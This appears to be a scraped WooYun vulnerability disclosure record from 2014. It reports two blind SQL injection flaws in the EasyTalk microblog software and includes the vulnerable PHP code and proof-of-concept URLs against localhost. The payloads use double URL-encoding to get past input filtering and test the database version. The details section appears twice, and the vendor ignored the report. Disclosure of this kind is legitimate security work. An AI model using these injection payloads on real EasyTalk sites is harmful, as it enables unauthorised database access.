{"id": 50184, "wybug_id": "wooyun-2014-078608", "wybug_title": "easytalk两枚sql盲注", "wybug_corp": "nextsns.com", "wybug_author": "zcy", "wybug_date": "2014-10-11 17:45", "wybug_open_date": "2014-10-16 17:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： easytalk两枚sql盲注 详细说明：  1.Home\\Lib\\Action\\SearchAction.class.php第22行代码中$keyword=urldecode(trim(htmlspecialchars($_REQUEST['keyword'])));keyword参数进行了urldecode操作。绕过全局gpc的过滤，导致注入。由于字符限制导致注入较为鸡肋http://127.0.0.1/easytalk/?m=search&type=user&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=5%23可输出数据\n\nhttp://127.0.0.1/easytalk/?m=search&type=user&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=4%23\n\n无数据返回2，http://127.0.0.1/easytalk/?m=topic&a=topic&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=5%23原理同上。urldecode导致绕过全局gpc\npublic function topic() {\t\t$keyword=$this->_get('keyword','urldecode');\t\tif ($keyword) {\t\t\t$topic = D('Topic')->where(\"topicname='$keyword'\")->find();            if ($topic) {                $isfollow=D('Mytopic')->isfollow($topic['id'],$this->my['user_id']);                $topicusers=D('MytopicView')->where(\"topicid='$topic[id]'\")->order('id desc')->limit(9)->select();\t\t\t\t//getwidget\t\t\t\t$widget=M('Topicwidget')->where(\"topicid='$topic[id]'\")->order('`order` ASC')->select();\t\t\t\tif ($widget) {\t\t\t\t\tforeach ($widget as $val) {\t\t\t\t\t\t$topicwidget[$val['widgettype']][]=$val;\t\t\t\t\t}\t\t\t\t}\t\t\t\t$this->assign('topicwidget',$topicwidget);            } else {                $count=$isfollow=0;            }\t\t\t\t\t\t$this->assign('comefrom','topic');\t\t\t$this->assign('keyword',$keyword);\t\t\t$this->assign('topic',$topic);\t\t\t$this->assign('topicusers',$topicusers);\t\t\t$this->assign('isfollow',$isfollow);\t\t\t$this->assign('subname','#'.$keyword.'#');\t\t\t$this->display();\t\t} else {\t\t\theader(\"location:\".SITE_URL.'/?m=topic&a=index');\t\t}\t}\nhttp://127.0.0.1/easytalk/?m=topic&a=topic&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=5%23\n\nhttp://127.0.0.1/easytalk/?m=topic&a=topic&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=4%23\n\n   漏洞证明：  1.Home\\Lib\\Action\\SearchAction.class.php第22行代码中$keyword=urldecode(trim(htmlspecialchars($_REQUEST['keyword'])));keyword参数进行了urldecode操作。绕过全局gpc的过滤，导致注入。由于字符限制导致注入较为鸡肋http://127.0.0.1/easytalk/?m=search&type=user&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=5%23可输出数据\n\nhttp://127.0.0.1/easytalk/?m=search&type=user&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=4%23\n\n无数据返回2，http://127.0.0.1/easytalk/?m=topic&a=topic&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=5%23原理同上。urldecode导致绕过全局gpc\npublic function topic() {\t\t$keyword=$this->_get('keyword','urldecode');\t\tif ($keyword) {\t\t\t$topic = D('Topic')->where(\"topicname='$keyword'\")->find();            if ($topic) {                $isfollow=D('Mytopic')->isfollow($topic['id'],$this->my['user_id']);                $topicusers=D('MytopicView')->where(\"topicid='$topic[id]'\")->order('id desc')->limit(9)->select();\t\t\t\t//getwidget\t\t\t\t$widget=M('Topicwidget')->where(\"topicid='$topic[id]'\")->order('`order` ASC')->select();\t\t\t\tif ($widget) {\t\t\t\t\tforeach ($widget as $val) {\t\t\t\t\t\t$topicwidget[$val['widgettype']][]=$val;\t\t\t\t\t}\t\t\t\t}\t\t\t\t$this->assign('topicwidget',$topicwidget);            } else {                $count=$isfollow=0;            }\t\t\t\t\t\t$this->assign('comefrom','topic');\t\t\t$this->assign('keyword',$keyword);\t\t\t$this->assign('topic',$topic);\t\t\t$this->assign('topicusers',$topicusers);\t\t\t$this->assign('isfollow',$isfollow);\t\t\t$this->assign('subname','#'.$keyword.'#');\t\t\t$this->display();\t\t} else {\t\t\theader(\"location:\".SITE_URL.'/?m=topic&a=index');\t\t}\t}\nhttp://127.0.0.1/easytalk/?m=topic&a=topic&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=5%23\n\nhttp://127.0.0.1/easytalk/?m=topic&a=topic&keyword=%2527and%20mid%28VERSION%28%29,1,1%29=4%23\n\n   修复方案：     版权声明：转载请注明来源 zcy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-16 17:46 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}